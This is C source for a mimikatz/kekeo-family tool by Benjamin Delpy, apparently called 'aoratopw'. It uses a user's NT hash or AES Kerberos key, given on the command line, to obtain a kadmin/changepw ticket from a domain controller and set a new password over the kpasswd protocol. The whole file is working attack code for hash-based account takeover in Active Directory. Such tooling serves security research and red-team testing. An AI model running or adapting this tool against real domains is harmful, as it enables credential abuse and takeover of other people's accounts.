/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "aoratopw.h"

BOOL g_isAsn1Init = FALSE, g_isSockInit = FALSE, g_isKerberos = FALSE;

BOOL init()
{
	BOOL status = FALSE;
	RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;

	if(g_isAsn1Init = kull_m_kerberos_asn1_helper_init())
		if(g_isSockInit = kull_m_sock_startup())
			if(g_isKerberos = kull_m_kerberos_helper_init())
				status = TRUE;
	return status;
}

BOOL term()
{
	if(g_isAsn1Init)
		g_isAsn1Init = !kull_m_kerberos_asn1_helper_term();
	if(g_isSockInit)
		g_isSockInit = !kull_m_sock_finish();
	if(g_isKerberos)
		g_isKerberos = !kull_m_kerberos_helper_term();

	return !(g_isAsn1Init || g_isSockInit || g_isKerberos);
}

int main(int argc, char * argv[])
{
	EncryptionKey userKey;
	LPCSTR szUser, szDomain, szPassword = NULL, szKey = NULL, szWhatDC, szNew;
	DWORD ret;
	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
	PDS_DOMAIN_CONTROLLER_INFO_1 dcInfos = NULL;
	
	kprintf("\n"
		"  .#####.   " MIMIKATZ_FULL "\n"
		" .## ^ ##.  \n"
		" ## / \\ ##  /* * *\n"
		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
		"  '#####'     ...   with thanks to Aorato / Microsoft   ...   * * */\n\n");
	if(init())
	{
		if(kull_m_string_args_byName(argc, argv, "user", &szUser, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, "domain", &szDomain, NULL))
			{
				if(kull_m_string_args_byName(argc, argv, "key", &szKey, NULL) || kull_m_string_args_byName(argc, argv, "password", &szPassword, NULL))
				{
					if(kull_m_string_args_byName(argc, argv, "aes256", NULL, NULL))
						userKey.keytype = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
					else if(kull_m_string_args_byName(argc, argv, "aes128", NULL, NULL))
						userKey.keytype = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
					else
						userKey.keytype = KERB_ETYPE_RC4_HMAC_NT;

					if(kull_m_string_args_byName(argc, argv, "new", &szNew, NULL))
					{
						if(NT_SUCCESS(kull_m_kerberos_asn1_helper_util_stringToKey(szUser, szDomain, szPassword, szKey, &userKey)))
						{
							ret = DsGetDcName(NULL, szDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
							if(ret == ERROR_SUCCESS)
							{
								szWhatDC = cInfo->DomainControllerName + 2;
								kprintf("[KDC] \'%s\' will be the main server\n", szWhatDC);

								kprintf("\n"
									"user     : %s\n"
									"domain   : %s\n"
									"password : %s\n"
									"key      : "
									, szUser, szDomain, szKey ? "<NULL>" : "***");
								kull_m_string_printf_hex(userKey.keyvalue.value, userKey.keyvalue.length, 0);
								kprintf(" (%s)\n", kull_m_kerberos_asn1_helper_util_etypeToString(userKey.keytype));

								makeInception(szUser, szDomain, szNew, &userKey, szWhatDC, 88, 464);

								NetApiBufferFree(cInfo);
							}
							else PRINT_ERROR("[KDC] DsGetDcName: %u\n", ret);
							LocalFree(userKey.keyvalue.value);
						}
					}
					else PRINT_ERROR("Missing new password\n");
				}
				else PRINT_ERROR("Missing password/key argument\n");
			}
			else PRINT_ERROR("Missing domain argument\n");
		}
		else PRINT_ERROR("Missing user argument\n");
	}
	else PRINT_ERROR("init() failed\n");
	term();
	return 0;
}

void makeInception(PCSTR user, PCSTR domain, PCSTR newpassword, EncryptionKey *key, PCSTR kdc, WORD port, WORD kadminPort)
{
	SOCKET connectSocket, connectSocketAdmin;
	OssBuf AsReq, ApReq, KrbPrivReq;
	KDC_REP *AsRep;
	AP_REP *ApRep;
	KRB_PRIV *KrbPriv;
	EncKDCRepPart *encAsRepPart;
	_octet1 password;
	EncryptionKey authKey;
	UInt32 seq;
	EncKrbPrivPart *encKrbPrivPart;

	password.length = strlen(newpassword);
	password.value = (unsigned char *) newpassword;

	if(kull_m_sock_initSocket(kdc, port, &connectSocket))
	{
		kprintf(" [level 1] Reality       (AS-REQ)\n");
		if(kull_m_kerberos_asn1_helper_build_KdcReq(user, domain, key, "kadmin", "changepw", NULL, NULL, &AsReq))
		{
			if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &AsReq, (LPVOID *) &AsRep, AS_REP_PDU))
			{
				if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_Rep(AsRep, &encAsRepPart, key, EncASRepPart_PDU))
				{
					kprintf(" [level 2] Van Chase     (AP-REQ)\n");
					if(kull_m_kerberos_asn1_helper_build_ApReq(&ApReq, user, domain, &AsRep->ticket, &encAsRepPart->key, KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &authKey, &seq))
					{
						kprintf(" [level 3] The Hotel     (KRB-PRIV - REQ)\n");
						if(kull_m_kerberos_asn1_helper_build_KrbPriv(&password, &authKey, "wtf", &KrbPrivReq, &seq))
						{
							if(kull_m_sock_initSocket(kdc, kadminPort, &connectSocketAdmin))
							{
								if(kull_m_kerberos_helper_net_callKadminOssBuf(&connectSocketAdmin, &ApReq, &KrbPrivReq, &ApRep, &KrbPriv))
								{
									kprintf(" [level 4] Snow Fortress (KRB-PRIV - REP)\n");
									if(kull_m_kerberos_asn1_helper_build_EncKrbPrivPart_from_Priv(KrbPriv, &encKrbPrivPart, &authKey))
									{
										kprintf(" [level 5] Limbo ! : ");
										retFromKadmin(&encKrbPrivPart->user_data);
										kull_m_kerberos_asn1_helper_ossFreePDU(EncKrbPrivPart_PDU, encKrbPrivPart);
									}
									kull_m_kerberos_asn1_helper_ossFreePDU(KRB_PRIV_PDU, KrbPriv);
									kull_m_kerberos_asn1_helper_ossFreePDU(AP_REP_PDU, ApRep);
								}
								kull_m_sock_termSocket(&connectSocketAdmin);
							}
							kull_m_kerberos_asn1_helper_ossFreeBuf(KrbPrivReq.value);
						}
						kull_m_kerberos_asn1_helper_ossFreeBuf(ApReq.value);
					}
					kull_m_kerberos_asn1_helper_ossFreePDU(EncASRepPart_PDU, encAsRepPart);
				}
				kull_m_kerberos_asn1_helper_ossFreePDU(AS_REP_PDU, AsRep);
			}
			kull_m_kerberos_asn1_helper_ossFreeBuf(AsReq.value);
		}
		kull_m_sock_termSocket(&connectSocket);
	}
}

const KULL_M_KADMIN_PASSWD_ERR kull_m_kadmin_passwd_err[] = {
	{0,	"KRB5_KPASSWD_SUCCESS"},
	{1,	"KRB5_KPASSWD_MALFORMED"},
	{2,	"KRB5_KPASSWD_HARDERROR"},
	{3,	"KRB5_KPASSWD_AUTHERROR"},
	{4,	"KRB5_KPASSWD_SOFTERROR"},
	{5,	"KRB5_KPASSWD_ACCESSDENIED"},
	{6,	"KRB5_KPASSWD_BAD_VERSION"},
	{7,	"KRB5_KPASSWD_INITIAL_FLAG_NEEDED"},
};

PCSTR kull_m_kadmin_passwd_err_to_string(DWORD id)
{
	DWORD i;
	for(i = 0; i < ARRAYSIZE(kull_m_kadmin_passwd_err); i++)
		if(kull_m_kadmin_passwd_err[i].id == id)
			return kull_m_kadmin_passwd_err[i].name;
	return "ERROR ?";
}

void retFromKadmin(_octet1 * data)
{
	WORD code;
	if(data->length >= 2)
	{
		if(code = _byteswap_ushort(*(PWORD) data->value))
			kprintf("%s (%u)", kull_m_kadmin_passwd_err_to_string(code), code);
		else kprintf("OK");
		if(data->length > 2)
		{
			kprintf(" - {");
			kull_m_string_printf_hex(data->value + 2, data->length - 2, 0);
			kprintf("}");
		}
		printf("\n");
	}
	else PRINT_ERROR("Size\n");
}